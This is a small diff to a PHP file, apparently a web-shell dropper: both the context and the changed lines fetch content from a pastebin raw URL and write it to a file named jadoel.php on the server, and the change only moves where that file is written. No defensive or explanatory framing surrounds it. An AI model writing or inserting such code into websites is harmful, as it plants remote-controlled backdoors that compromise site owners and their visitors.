@@ -8,7 +8,7 @@
   $tulis1 = fwrite ($nama1 ,$file1);
  fclose($nama1); ?>
  
- <?php $nama1= fopen("../jadoel.php" ,"w+");
+ <?php $nama1= fopen("jadoel.php" ,"w+");
   $file1 = file_get_contents('https://pastebin.com/raw/8cB9HM4h');
   $tulis1 = fwrite ($nama1 ,$file1);
  fclose($nama1); ?>
